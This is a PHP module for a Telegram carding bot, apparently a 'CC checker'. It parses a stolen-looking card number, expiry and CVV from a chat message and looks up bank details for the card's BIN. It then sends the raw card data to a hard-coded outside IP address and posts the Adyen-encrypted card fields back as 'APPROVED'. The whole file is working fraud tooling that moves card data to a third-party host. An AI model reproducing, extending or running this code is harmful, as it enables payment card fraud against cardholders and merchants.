<?php

/*

///==[Stripe CC Checker Commands]==///

/ss creditcard - Checks the Credit Card

*/

$gateway = "Adyen Auth";
$check_type = "CVV";
$dir = dirname(__dir__,2);
include($dir."/config/config.php");
include($dir."/config/variables.php");
include_once($dir."/functions/bot.php");
include_once($dir."/functions/db.php");
include_once($dir."/functions/functions.php");
////////////====[MUTE]====////////////
$time_start = microtime(true);

if(strpos($message, "/ec ") === 0 || strpos($message, "!ec ") === 0 || strpos($message, ".ec ") === 0){

    $trans_completed = false;
    $tries = 0;
    $limit = 1;
    while ($trans_completed == false && $tries < $limit) {
        $tries = $tries + 1;
        $antispam = antispamCheck($userId);
        $isPremium = get_prem_info($userId);
        addUser($userId);
        if ($antispam != False && $isPremium == false){
            bot('sendmessage', [
                'chat_id' => $chat_id,
                'text' => "[<u>ANTI SPAM</u>] Try again after <b>$antispam</b>s.",
                'parse_mode' => 'html',
                'reply_to_message_id' => $message_id
            ]);
            return;

        } else {
            $messageidtoedit1 = bot('sendmessage', [
                'chat_id' => $chat_id,
                'text' => "<b>Wait for result...</b>",
                'parse_mode' => 'html',
                'reply_to_message_id' => $message_id

            ]);


            $messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
            $lista = substr($message, 3);


            if (preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)){
                $creditcard = $matches[0][0];
                $cc = multiexplode(array(":", "|", "/", " "), $creditcard)[0];
                $mm = multiexplode(array(":", "|", "/", " "), $creditcard)[1];
                $yy = multiexplode(array(":", "|", "/", " "), $creditcard)[2];
                $yy = "20". str_replace("20","",$yy);
                $cvv = multiexplode(array(":", "|", "/", " "), $creditcard)[3];
                $yy1 = substr($yy, 2, 2);
                $bin = substr($cc, 0, 6);
                $cbin = substr($cc, 0, 1);
                ###CHECKER PART###
                $binlist = json_decode(fbankinfo($bin), true);
                $ccbank = $binlist['Bank'];
                $ccvendor = $binlist['Vendor'];
                $cctype = $binlist['Bank_Info'];
                $cc_country = $binlist['Country'];
                $abn = $binlist['Abn'];
                $cc_emoji = $binlist['emoji'];
                $lista = "$cc|$mm|$yy|$cvv";

                $info = json_decode(random_info(), true);
                $fname = $info['fname'];
                $lname = $info['lname'];
                $email = $info['email'];
                $street = $info['street'];
                $city = $info['city'];
                $state = $info['state'];
                $phone = $info['phone'];
                $postcode = $info['postcode'];
                ###CHECKER PART###
                $zip = rand(90010, 94000);
                if ($cbin == 5){
                    $cbin = 'mastercard';
                } else if ($cbin == 4){
                    $cbin = 'visa';
                }
                $Amount = 0.8;
                $str = substr(RandomString(), 0, 7);
                $cookie = RandomString();
                /////////////////////==========[Unavailable if empty]==========////////////////
                $data = file_get_contents("http://51.145.91.244/doc-bot/modules/checker/node_modules/ss.php?lista=".$lista);
                   $encData = GetStr($data,"[CardData=",",");
                $enc_cc = GetStr($data,"CC=",",");
                $enc_mm = GetStr($data,"Month=",",");
                $enc_yy = GetStr($data,"Year=",",");
                $enc_cvv = GetStr($data,"cvv=","]");
                $time = number_format(microtime(true) - $time_start, 2);

                    bot('editMessageText', [
                        'chat_id' => $chat_id,
                        'message_id' => $messageidtoedit,
                        'text' => "<b>APPROVED ✅
<b>Card -»</b> <code>$lista</code>
<b>CARD DATA -»</b><code>$encData</code>
<b>CC -»</b><code>$enc_cc</code>
<b>MONTH -»</b><code>$enc_mm</code>
<b>YEAR -»</b><code>$enc_yy</code>
<b>CVV -»</b><code>$enc_cvv</code>
Gateway -» Adyen Encrypt
Time -» <b>$time</b><b>s</b>
------- Bin Info -------</b>
<b>Bank -»</b> $ccbank
<b>Brand -»</b> $ccvendor
<b>Type -»</b> $cctype
<b>Country -»</b> $cc_country($abn) $cc_emoji 
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>",
                        'parse_mode' => 'html',
                        'disable_web_page_preview' => 'true']);

            } else {
                bot('editMessageText', [
                    'chat_id' => $chat_id,
                    'message_id' => $messageidtoedit,
                    'text' => "<b>INVALID FORMAT: (cmd) XXXXXXXXXXXXXXXXXX|XX|XXXX|XXX</b>",
                    'parse_mode' => 'html', 'disable_web_page_preview' => 'true']);
                $trans_completed = true;
            }
        }
    }
}
?>
